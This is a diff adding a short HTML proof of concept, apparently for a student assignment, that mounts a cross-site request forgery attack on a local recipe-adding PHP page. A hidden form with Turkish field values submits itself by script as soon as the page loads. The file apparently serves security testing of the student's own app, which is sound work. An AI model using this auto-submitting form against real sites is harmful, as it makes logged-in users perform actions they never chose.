@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>CSRF Attack Example</h1>
+    <form id="csrfForm" action="http://localhost/ödev/tarif_ekle.php" method="post" enctype="multipart/form-data">
+        <input type="hidden" name="title" value="Kötü Tarif">
+        <input type="hidden" name="description" value="Bu tarif CSRF saldırısıyla eklendi.">
+        <input type="hidden" name="category" value="Saldırı">
+        <input type="hidden" name="is_private" value="1">
+        <input type="hidden" name="image" value="">
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
